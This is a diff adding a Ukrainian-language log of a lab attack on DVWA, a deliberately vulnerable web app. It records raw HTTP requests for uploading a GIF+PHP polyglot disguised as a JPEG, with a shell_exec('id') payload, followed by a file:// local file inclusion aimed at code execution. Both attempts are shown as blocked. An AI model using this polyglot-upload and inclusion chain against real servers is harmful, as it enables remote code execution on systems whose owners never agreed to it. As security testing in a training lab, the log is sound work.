@@ -1,0 +1,77 @@
+# V3. Поліглот GIF+PHP (.jpg) + LFI через file:// → RCE
+
+Рівень безпеки DVWA: high
+
+Результат: заблоковано (HTTP 200)
+
+
+
+### Завантаження поліглота .jpg
+>>> POST http://127.0.0.1:8081/vulnerabilities/upload/
+>>> Content-Type: multipart/form-data; boundary=c8e0ad4a9c113fb000dbb581add5fc4d
+>>> Cookie: security=high; PHPSESSID=ad111c0398d9a5332c5d13241b1a5d34
+>>>
+--c8e0ad4a9c113fb000dbb581add5fc4d
+Content-Disposition: form-data; name="Upload"
+
+Upload
+--c8e0ad4a9c113fb000dbb581add5fc4d
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+--c8e0ad4a9c113fb000dbb581add5fc4d
+Content-Disposition: form-data; name="uploaded"; filename="rgr_v3_299b2b45.jpg"
+Content-Type: image/jpeg
+
+GIF89a\x01\x00\x01\x00\xfd\x00\x00\x00\x00\x00\xfd\xfd\xfd!\xfd\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;<?php echo "RGR-V8-" . (7*191) . " id: " . trim((string) shell_exec("id")); ?>
+--c8e0ad4a9c113fb000dbb581add5fc4d--
+
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 1572
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+
+		Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA)
+				Home
+Instructions
+Setup / Reset DB
+Brute Force
+Command Injection
+CSRF
+File Inclusion
+File Upload
+Insecure CAPTCHA
+SQL Injection
+SQL Injection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript Attacks
+Authorisation Bypass
+Open HTTP Redirect
+Cryptography
+API
+DVWA Security
+PHP Info
+About
+Logout
+	Vulnerability: File Upload
+			Choose an image to upload:
+		Зображення не завантажено. Дозволено лише JPEG або PNG до 100 КБ.
+	More Information
+		https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+		https://www.acunetix.com/websitesecurity/upload-forms-threat/
+				  Username: adminSecurity Level: highLocale: enSQLi DB: mysql
+				Damn Vulnerable Web Application (DVWA)
+
+
+### Включення через ?page=file://…
+>>> GET http://127.0.0.1:8081/vulnerabilities/fi/?page=file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fhackable%2Fuploads%2Frgr_v3_299b2b45.jpg
+>>> Cookie: security=high; PHPSESSID=ad111c0398d9a5332c5d13241b1a5d34
+<<< HTTP 200 OK
+<<< Content-Type: text/html; charset=UTF-8
+<<< Content-Length: 22
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+ERROR: File not found!
